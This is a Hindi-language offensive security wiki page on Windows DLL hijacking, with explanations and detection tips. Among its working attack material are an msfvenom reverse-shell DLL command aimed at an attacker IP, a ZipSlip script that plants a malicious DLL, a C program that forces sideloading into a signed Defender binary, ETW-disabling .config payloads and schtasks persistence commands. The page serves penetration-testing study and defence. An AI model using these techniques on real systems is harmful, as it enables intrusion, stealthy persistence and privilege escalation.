# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## मूल जानकारी

DLL Hijacking में किसी भरोसेमंद application से malicious DLL load करवाने के लिए उसमें हेरफेर किया जाता है। इस शब्द में **DLL Spoofing, Injection, और Side-Loading** जैसी कई रणनीतियाँ शामिल हैं। इसका मुख्य उपयोग code execution और persistence हासिल करने के लिए, और कम मामलों में privilege escalation के लिए किया जाता है। यहाँ escalation पर ध्यान देने के बावजूद, hijacking का तरीका अलग-अलग उद्देश्यों में एक जैसा रहता है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीके अपनाए जाते हैं। हर तरीके की प्रभावशीलता application की DLL loading strategy पर निर्भर करती है:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: असली DLL को malicious DLL से बदलना। वैकल्पिक रूप से, असली DLL की functionality बनाए रखने के लिए DLL Proxying का उपयोग किया जा सकता है।
2. **DLL Search Order Hijacking**: Malicious DLL को search path में legitimate DLL से पहले रखना और application के search pattern का फायदा उठाना।
3. **Phantom DLL Hijacking**: Application के लिए एक malicious DLL बनाना, ताकि वह उसे ऐसी ज़रूरी DLL समझकर load करे जो वास्तव में मौजूद नहीं है।
4. **DLL Redirection**: Application को malicious DLL की ओर निर्देशित करने के लिए `%PATH%` या `.exe.manifest` / `.exe.local` files जैसे search parameters में बदलाव करना।
5. **WinSxS DLL Replacement**: WinSxS directory में legitimate DLL को उसके malicious विकल्प से बदलना। यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: Malicious DLL को copied application के साथ, user-controlled directory में रखना। यह Binary Proxy Execution तकनीकों जैसा है।

Application अपना **DLL loader** भी लागू कर सकता है। कोई privileged process `Libraries` या `Plugins` जैसी child directory की files सूचीबद्ध कर सकता है और सामान्य Windows DLL search order से स्वतंत्र होकर, चुनी गई DLL को helper को दे सकता है। अगर कोई दूसरा account उसी directory में files बना सकता है, तो इसे जाँच के लिए एक सुराग मानें: process की identity, directory की प्रभावी ACL, file चुनने का नियम और वहाँ तक पहुँचने योग्य load operation की पुष्टि करें। Executable के बगल में writable directory होने से यह साबित नहीं होता कि process वहाँ से DLLs load करता है।

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Installation के बाद PE import grafting

Classic side-loading में trusted PE अपरिवर्तित रहता है और DLL name resolution को अपने पक्ष में किया जाता है। इसके बजाय, **Import grafting** उस PE में बदलाव करता है जिसे trusted program पहले से load कर चुका है। Attacker, attacker-controlled DLL के लिए एक import descriptor और उससे जुड़े lookup/IAT entries जोड़ता है। जब Windows उस dependency को recursively resolve करता है, तो वह जोड़ी गई DLL को map करता है और अन्यथा legitimate process के भीतर उसका initialization code चलाता है। यह disk पर PE में किया गया बदलाव है; यह runtime hook के ज़रिए live IAT function pointer को बदलने जैसी प्रक्रिया नहीं है।<sup>[[26]](#references)[[27]](#references)</sup>

बदला गया PE, user या Task Scheduler द्वारा launch किए गए executable के बजाय, कोई intermediate vendor DLL हो सकता है। दोबारा इस्तेमाल की जा सकने वाली chain इस प्रकार है:<sup>[[27]](#references)</sup>

1. Legitimate executable और उसकी dependencies को attacker-controlled directory में copy करें।
2. एक dependency की import structures को patch करें ताकि वे malicious DLL को reference करें, और साथ ही dependency के अपेक्षित exports और सामान्य व्यवहार को बनाए रखें।
3. Legitimate executable शुरू करने के लिए autorun या scheduled task configure करें। Loader बदली गई dependency और फिर नई import की गई DLL को map करता है। Task enumeration के लिए [Autoruns के ज़रिए Privilege Escalation](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) देखें।
4. `DllMain` में भारी काम न रखें; देखे गए loader ने एक worker thread बनाया और staged decryption वहीं जारी रखी।

यह vendor-side supply-chain compromise से अलग है, जहाँ vendor package साफ़ होता है और import में बदलाव installation के बाद किया जाता है। Staged directory में हर module की जाँच करें, सिर्फ host EXE की नहीं: dependencies की import lists और hashes की known-good installation से तुलना करें, signatures verify करें, और `C:\ProgramData` जैसी अप्रत्याशित writable locations से launch की गई vendor binaries की जाँच करें। ऐसी directory में copied crash reporter या updater की ओर इशारा करने वाला scheduled task एक विशेष रूप से उपयोगी pivot है।<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

किसी trusted **.NET Framework** process से attacker code load करवाने का एकमात्र तरीका classic DLL sideloading नहीं है। अगर target executable एक **managed** application है, तो CLR उस executable के नाम वाली **application configuration file** को भी देखता है (उदाहरण के लिए `Setup.exe.config`)। उस file में custom **AppDomainManager** परिभाषित किया जा सकता है। अगर config किसी attacker-controlled assembly की ओर इशारा करता है, जो EXE के बगल में रखी हो, तो CLR उसे **application के सामान्य code path से पहले** load करता है और वह trusted process के भीतर चलती है।<sup>[[24]](#references)</sup>

Microsoft के .NET Framework configuration schema के अनुसार, custom manager का उपयोग करने के लिए `<appDomainManagerAssembly>` और `<appDomainManagerType>` दोनों मौजूद होने चाहिए।<sup>[[16]](#references)[[17]](#references)</sup>

न्यूनतम config:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

न्यूनतम मैनेजर:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Practical notes:
- यह **.NET Framework specific** tradecraft है। यह Win32 DLL search order पर नहीं, बल्कि CLR config parsing पर निर्भर करता है।
- Host वास्तव में **managed EXE** होना चाहिए। Quick triage: `sigcheck -m target.exe`, `corflags target.exe`, या PE metadata में **CLR Runtime Header** देखें।
- Config filename का executable name से बिल्कुल मेल खाना चाहिए (`<binary>.config`) और यह आमतौर पर **EXE के बगल में** होती है।
- यह **signed Microsoft/vendor binaries** के साथ उपयोगी है, क्योंकि trusted EXE बिना बदलाव के रहता है, जबकि malicious managed assembly in-process execute होती है।
- यदि आपके पास पहले से writable installer/update directory है, तो AppDomainManager hijacking को **first stage** के रूप में इस्तेमाल किया जा सकता है; बाद के stages के लिए classic DLL sideloading या reflective loading का उपयोग करें।

### Downloader + scheduled-task bootstrap के रूप में AppDomainManager

एक practical intrusion pattern में trusted managed EXE के साथ malicious `*.config` और malicious AppDomainManager DLL का उपयोग किया जाता है, जो केवल एक **छोटे bootstrapper** के रूप में काम करती है:<sup>[[25]](#references)</sup>

1. User किसी भरोसेमंद लगने वाली जगह, जैसे `%USERPROFILE%\Downloads`, से signed .NET installer या updater launch करता है।
2. साथ में मौजूद config, legitimate app logic शुरू होने **से पहले** CLR से attacker assembly load करवाती है।
3. Malicious manager एक **path gate** लागू करता है (उदाहरण के लिए, केवल तभी आगे बढ़ना जब host EXE `Downloads` से चल रही हो, और second stage को केवल `%LOCALAPPDATA%` से चलने देना)।
4. Check पास होने पर, यह real payload को `%LOCALAPPDATA%\PerfWatson2.exe` जैसे user-writable path में download करता है और scheduled task के साथ persistence स्थापित करता है।

यह variant क्यों महत्वपूर्ण है:
- Signed host EXE अपरिवर्तित रहती है, इसलिए केवल main binary के hashes की जाँच करने वाला triage compromise को पहचान नहीं सकता।
- Simple **path-based anti-analysis** आम है: ZIP/EXE/DLL triad को Desktop, Temp या sandbox path पर ले जाने से जानबूझकर chain टूट सकती है।
- First-stage AppDomainManager DLL छोटी और low-noise रह सकती है, जबकि real implant बाद में fetch किया जाता है।

इस pattern के साथ अक्सर दिखने वाला minimal persistence example:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

नोट्स:
- ` /rl highest` का अर्थ उस user/session के लिए **उपलब्ध अधिकतम स्तर** है; इससे अपने-आप SYSTEM तक escalation की गारंटी नहीं मिलती।
- इस technique को classic missing-DLL search-order hijacking के बजाय अक्सर **.NET config abuse के ज़रिए execution/persistence** के रूप में वर्गीकृत करना बेहतर है, हालांकि operators अक्सर दोनों को एक साथ chain करते हैं।

डिटेक्शन संकेत:
- Signed .NET executables, जो **ZIP extraction paths**, `Downloads`, `%TEMP%` या user-writable अन्य folders से launch होते हैं और जिनके साथ `<exe>.config` **उसी directory में** होता है।
- नए scheduled tasks, जिनकी action `%LOCALAPPDATA%`, `%APPDATA%` या `Downloads` में मौजूद paths की ओर point करती है और जिनके नाम browser/vendor updaters जैसे लगते हैं।
- ऐसे managed bootstrap processes, जो कुछ ही समय में एक और EXE download करते हैं, फिर `schtasks.exe` spawn करते हैं।
- ऐसे samples, जो executable path किसी अपेक्षित user-profile directory से match न होने पर जल्दी exit हो जाते हैं।

### sideload chain को फिर से launch करने के लिए मौजूदा scheduled task को hijack करना

Persistence के लिए, केवल **नया task बनाने** पर ध्यान न दें। कुछ intrusion sets तब तक इंतज़ार करते हैं जब तक कोई वैध installer एक **सामान्य updater task** न बना दे, फिर वे **task action को rewrite** करते हैं ताकि मौजूदा नाम, author और trigger defenders को परिचित लगें।

दोबारा इस्तेमाल किया जा सकने वाला workflow:
1. वैध software install/run करें और पहचानें कि वह सामान्यतः कौन-सा task बनाता है।
2. Task XML export करें और मौजूदा `<Exec><Command>` / `<Arguments>` values नोट करें।<sup>[[23]](#references)</sup>
3. केवल action बदलें, ताकि task user-writable staging directory से आपका **trusted host EXE** शुरू करे; इसके बाद वह real payload को side-load या AppDomain-load करे।
4. कोई नया, आसानी से दिखने वाला persistence artifact बनाने के बजाय उसी task name को फिर से register करें।

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

यह ज़्यादा stealthy क्यों है:
- Task का नाम अब भी वैध दिख सकता है (उदाहरण के लिए, vendor updater)।
- इसे **Task Scheduler service** launch करती है, इसलिए parent/ancestor validation में अक्सर `explorer.exe` के बजाय अपेक्षित scheduling chain दिखाई देती है।
- जो DFIR teams केवल **नए task names** खोजती हैं, वे ऐसा task चूक सकती हैं जिसका registration पहले से मौजूद था, लेकिन जिसकी action अब `%LOCALAPPDATA%`, `%APPDATA%` या किसी अन्य attacker-controlled path की ओर point करती है।

तेज़ hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML और `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata की baseline से तुलना करें।
- जब कोई **vendor जैसा दिखने वाला updater task**, **user-writable directories** से execute हो या साथ में मौजूद `*.config` file वाली .NET EXE launch करे, तो alert करें।

> [!TIP]
> HTML staging, AES-CTR configs और .NET implants को DLL sideloading के साथ जोड़ने वाली step-by-step chain के लिए, नीचे दिया गया workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing DLLs ढूँढना

किसी system में missing DLLs ढूँढने का सबसे आम तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना और **नीचे दिए गए 2 filters सेट** करना है:

![Common Techniques - Missing DLLs ढूँढना: किसी system में missing DLLs ढूँढने का सबसे आम तरीका sysinternals से procmon चलाना और नीचे दिए गए 2 filters सेट करना](<../../../images/image (961).png>)

![Common Techniques - Missing DLLs ढूँढना: किसी system में missing DLLs ढूँढने का सबसे आम तरीका sysinternals से procmon चलाना और नीचे दिए गए 2 filters सेट करना](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएँ:

![Common Techniques - Missing DLLs ढूँढना: और केवल File System Activity दिखाएँ](<../../../images/image (153).png>)

अगर आप **सामान्य तौर पर missing DLLs** ढूँढ रहे हैं, तो इसे कुछ **seconds** तक **चलता रहने दें**।\
अगर आप किसी **specific executable के अंदर missing DLL** ढूँढ रहे हैं, तो **"Process Name" "contains" `<exec name>`** जैसा एक और filter सेट करें, उसे execute करें और events capture करना बंद कर दें।<sup>[[9]](#references)</sup>

## Missing DLLs का Exploitation

Privileges escalate करने के लिए, ऐसी **DLL ढूँढें जिसे कोई privileged process ऐसी location से load करने की कोशिश करता है जहाँ आप write कर सकते हैं**। ऐसा तब हो सकता है जब आप उस directory को control करते हों जिसे legitimate DLL वाली directory से पहले search किया जाता है, या जब माँगी गई DLL मौजूद न हो और आप search की जाने वाली directories में से किसी एक में write कर सकते हों।

### Dll Search Order

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **में आप देख सकते हैं कि DLLs को विशेष रूप से कैसे load किया जाता है।**

**Windows applications** DLLs को **पहले से तय search paths** के एक खास क्रम में खोजती हैं। DLL hijacking की समस्या तब पैदा होती है जब किसी harmful DLL को इन directories में से किसी एक में रणनीतिक रूप से रखा जाता है, ताकि वह authentic DLL से पहले load हो जाए। इसे रोकने का एक तरीका यह सुनिश्चित करना है कि application, अपनी ज़रूरत की DLLs को refer करने के लिए absolute paths का इस्तेमाल करे।

नीचे **32-bit** systems का **DLL search order** दिया गया है:

1. वह directory जहाँ से application load हुई है।
2. system directory। इस directory का path पाने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function का इस्तेमाल करें।(_C:\Windows\System32_)
3. 16-bit system directory। इस directory का path पाने के लिए कोई function नहीं है, लेकिन इसे search किया जाता है। (_C:\Windows\System_)
4. Windows directory। इस directory का path पाने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function का इस्तेमाल करें।
   1. (_C:\Windows_)
5. current directory।
6. PATH environment variable में दी गई directories। ध्यान दें कि इसमें **App Paths** registry key से तय किया गया per-application path शामिल नहीं है। DLL search path तय करते समय **App Paths** key का इस्तेमाल नहीं होता।

यह **SafeDllSearchMode** enabled होने पर default search order है। Disabled होने पर current directory दूसरे स्थान पर आ जाती है। इस feature को disable करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाएँ और इसे 0 पर सेट करें (default रूप से enabled है)।

अगर [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ call किया जाता है, तो search उस executable module की directory से शुरू होती है जिसे **LoadLibraryEx** load कर रहा है।

अंत में, DLL को नाम के बजाय absolute path से load किया जा सकता है। उस स्थिति में, Windows केवल उसी path पर DLL को खोजता है; नाम से माँगी गई dependencies पर लागू search order अब भी लागू होता है।

Search order बदलने के और भी तरीके हैं, लेकिन मैं उन्हें यहाँ नहीं समझाऊँगा।

### Arbitrary file write को missing-DLL hijack में chain करना

**संबंधित technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) का इस्तेमाल करके उन DLL names को इकट्ठा करें जिन्हें process खोजता है, लेकिन ढूँढ नहीं पाता।<sup>[[14]](#references)</sup>
2. अगर binary **schedule/service** पर चलती है, तो उन names में से किसी एक नाम वाली DLL को **application directory** (search-order entry #1) में रखने पर वह अगले execution में load होगी। एक .NET scanner के मामले में, असली copy को `C:\Program Files\dotnet\fxr\...` से load करने से पहले process ने `C:\samples\app\` में `hostfxr.dll` खोजी।
3. किसी भी export के साथ payload DLL बनाएँ (जैसे reverse shell): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`।
4. अगर आपका primitive **ZipSlip-style arbitrary write** है, तो ऐसा ZIP बनाएँ जिसकी entry extraction dir से बाहर निकल जाए, ताकि DLL app folder में पहुँच जाए:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Archive को watched inbox/share पर पहुंचाएं; जब scheduled task process को दोबारा launch करेगा, तो यह malicious DLL लोड करेगा और service account के रूप में आपका code execute करेगा।

### RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए sideloading को बाध्य करना

नए बनाए गए process के DLL search path को deterministically प्रभावित करने का एक advanced तरीका यह है कि process बनाते समय ntdll के native APIs का इस्तेमाल करके RTL_USER_PROCESS_PARAMETERS में DllPath field सेट की जाए। यहां attacker-controlled directory देने पर, जो target process किसी imported DLL को नाम से resolve करता है (कोई absolute path नहीं और safe loading flags का इस्तेमाल नहीं), उसे उस directory से malicious DLL लोड करने के लिए बाध्य किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx से process parameters बनाएं और एक custom DllPath दें, जो आपके नियंत्रित folder (उदाहरण के लिए, वह directory जहां आपका dropper/unpacker मौजूद है) की ओर point करता हो।
- RtlCreateUserProcess से process बनाएं। जब target binary किसी DLL को नाम से resolve करेगी, तो loader resolution के दौरान दिए गए DllPath को देखेगा, जिससे reliable sideloading संभव होगी, भले ही malicious DLL target EXE के साथ उसी directory में मौजूद न हो।

नोट्स/सीमाएं
- इसका असर बनाए जा रहे child process पर पड़ता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- Target को किसी DLL को नाम से import या LoadLibrary करना होगा (कोई absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का इस्तेमाल नहीं)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence को बदल सकते हैं।

न्यूनतम C उदाहरण (ntdll, wide strings, सरलीकृत error handling):

<details>
<summary>पूरा C उदाहरण: RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए DLL sideloading को बाध्य करना</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

परिचालन उपयोग का उदाहरण
- अपनी DllPath डायरेक्टरी में एक malicious xmllite.dll रखें (जो आवश्यक functions export करती हो या असली DLL को proxy करती हो)।
- ऐसा signed binary लॉन्च करें जिसके बारे में पता हो कि वह ऊपर बताई गई technique से xmllite.dll को नाम से खोजता है। Loader, दिए गए DllPath के ज़रिए import को resolve करता है और आपकी DLL को sideload करता है।

यह technique वास्तविक हमलों में multi-stage sideloading chains चलाने के लिए देखी गई है: शुरुआती launcher एक helper DLL डालता है, जो फिर custom DllPath के साथ Microsoft-signed, hijackable binary को spawn करता है, ताकि वह staging directory से attacker की DLL लोड करे।<sup>[[6]](#references)</sup>


### `.exe.config` के ज़रिए .NET AppDomainManager hijacking

**.NET Framework** targets के लिए, application की साथ वाली **`.exe.config`** फ़ाइल का दुरुपयोग करके memory patch किए बिना **`Main()` से पहले** sideloading की जा सकती है। केवल Win32 DLL search order पर निर्भर रहने के बजाय, attacker एक legitimate .NET EXE के बगल में malicious config और एक या अधिक attacker-controlled assemblies रखता है।

यह chain इस तरह काम करती है:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE शुरू होता है और **CLR `<exe>.config` पढ़ता है**।
2. Config, **`<appDomainManagerAssembly>`** और **`<appDomainManagerType>`** सेट करता है, ताकि runtime attacker-controlled `AppDomainManager` को instantiate करे।
3. Malicious manager को trusted host process के अंदर **`Main()` से पहले execution** मिलता है।
4. यही config CLR को पहले local assemblies resolve करने के लिए बाध्य कर सकता है (उदाहरण के लिए `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) और inline patching के बिना runtime validation/telemetry को कमज़ोर कर सकता है।

Campaign-जैसा pattern (directives / CLR version के अनुसार सटीक nesting अलग हो सकती है):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

यह क्यों उपयोगी है:
- **`<probing privatePath="."/>`** assembly resolution को application directory तक सीमित रखता है, जिससे यह फ़ोल्डर एक अनुमानित sideloading surface बन जाता है।<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** CLR initialization के दौरान, legitimate app logic चलने से पहले, execution को attacker code में ले जाते हैं।<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** full-trust app को strong-name validation failure के बिना unsigned या tampered assemblies load करने दे सकता है।<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** newer assemblies पर publisher-policy redirects से बचाता है।<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** runtime selection को अधिक deterministic बनाता है।<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** खास तौर पर दिलचस्प है, क्योंकि configuration से **CLR अपनी ETW visibility को disable करता है**—implant द्वारा memory में `EtwEventWrite` patch करने के बजाय।

हालिया campaigns में देखा गया operational pattern:
- Stage 1 में `setup.exe`, `setup.exe.config`, और local assemblies डाले जाते हैं।
- Stage 2 में इन्हें एक विश्वसनीय दिखने वाले **AppData update** फ़ोल्डर में copy किया जाता है, host का नाम बदलकर `update.exe` जैसा रखा जाता है, और फिर **scheduled task** के ज़रिए इसे दोबारा launch किया जाता है।
- Stage 3 में final RAT DLL/export load करने से पहले execution context (उदाहरण के लिए, Task Scheduler से अपेक्षित parent `svchost.exe`) verify किया जाता है।

Hunting के सुझाव:
- User-writable locations में suspicious adjacent **`.config`** files के साथ चलने वाले signed या अन्यथा legitimate **.NET executables**।
- `.config` files जिनमें **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, या **`etwEnable enabled="false"`** हों।
- ऐसे scheduled tasks जो **`%LOCALAPPDATA%`** या app-specific `\bin\update\` directories से renamed update binaries को दोबारा launch करते हों।
- ऐसी parent/child chains जहाँ scheduled task किसी trusted .NET host को launch करता हो, जो तुरंत अपनी directory से non-vendor assemblies load करे।

#### Windows docs में DLL search order के अपवाद

Windows documentation में standard DLL search order के कुछ अपवाद बताए गए हैं:

- जब **memory में पहले से loaded DLL के समान नाम वाली DLL** मिलती है, तो system सामान्य search को bypass करता है। इसके बजाय, DLL को memory में पहले से मौजूद DLL पर default करने से पहले redirection और manifest की जाँच की जाती है। **इस स्थिति में, system DLL के लिए search नहीं करता**।
- अगर DLL को मौजूदा Windows version के लिए **known DLL** के रूप में पहचाना जाता है, तो system search process को **छोड़कर** known DLL के अपने version और उसकी dependent DLLs का उपयोग करता है। Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** में इन known DLLs की सूची होती है।
- यदि किसी **DLL की dependencies** हैं, तो इन dependent DLLs की search ऐसे की जाती है मानो उन्हें केवल उनके **module names** से दर्शाया गया हो—चाहे शुरुआती DLL की पहचान full path से हुई हो।

### Privileges बढ़ाना

**आवश्यकताएँ**:

- ऐसी process की पहचान करें जो **अलग privileges** (horizontal या lateral movement) के तहत चलती हो या चलेगी, और जिसमें **DLL मौजूद न हो**।
- सुनिश्चित करें कि किसी भी ऐसी **directory** में **write access** उपलब्ध हो जिसमें **DLL** को **search किया जाएगा**। यह location executable की directory या system path के भीतर कोई directory हो सकती है।

डिफ़ॉल्ट रूप से ये prerequisites असामान्य हैं: privileged executables में आमतौर पर DLL dependencies missing नहीं होतीं, और standard users सामान्यतः system search-path directories में write नहीं कर सकते। फिर भी, misconfigured environments में दोनों स्थितियाँ सामने आ सकती हैं।\
अगर आवश्यकताएँ पूरी हों, तो [UACME](https://github.com/hfiref0x/UACME) project देखें। इसका मुख्य उद्देश्य UAC bypass है, लेकिन इसमें कुछ खास Windows versions के लिए DLL-hijacking PoCs हैं, जिन्हें अक्सर आपके मिले writable directory के अनुसार ढाला जा सकता है।

ध्यान दें कि आप इस तरह **किसी folder में अपनी permissions जाँच सकते हैं**:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

और **PATH में शामिल सभी फ़ोल्डरों की अनुमतियाँ जाँचें**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

आप executable के imports और dll के exports भी जांच सकते हैं:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

पूरी guide के लिए कि **System Path folder** में write permissions के साथ privileges escalate करने के लिए **DLL Hijacking का दुरुपयोग कैसे करें**, देखें:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जांचेगा कि क्या आपके पास system PATH के किसी folder में write permissions हैं।\
इस vulnerability को खोजने के लिए अन्य उपयोगी automated tools हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### Example

यदि आपको कोई exploitable scenario मिलता है, तो उसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण चीजों में से एक है **ऐसी dll बनाना जो executable द्वारा import किए जाने वाले कम-से-कम सभी functions को export करे**। ध्यान दें कि DLL Hijacking, [Medium Integrity level से High **(UAC को bypass करके)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM तक**](../index.html#from-high-integrity-to-system)**.** escalate करने में भी उपयोगी है। **Valid dll बनाने का तरीका** जानने के लिए execution के लिए DLL hijacking पर केंद्रित यह DLL hijacking अध्ययन देखें: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, **अगले section** में आपको कुछ **basic dll codes** मिलेंगे, जिन्हें **templates** के रूप में इस्तेमाल करना या **बिना आवश्यक functions को export करने वाली dll** बनाना उपयोगी हो सकता है।

## **DLLs बनाना और compile करना**

### **DLL Proxifying**

मूल रूप से, **DLL proxy** एक ऐसी DLL है जो **load होने पर आपका malicious code execute** कर सकती है, और साथ ही **वास्तविक library को सभी calls relay करके** उसे **expose** करती है और **अपेक्षा के अनुसार काम** करती है।

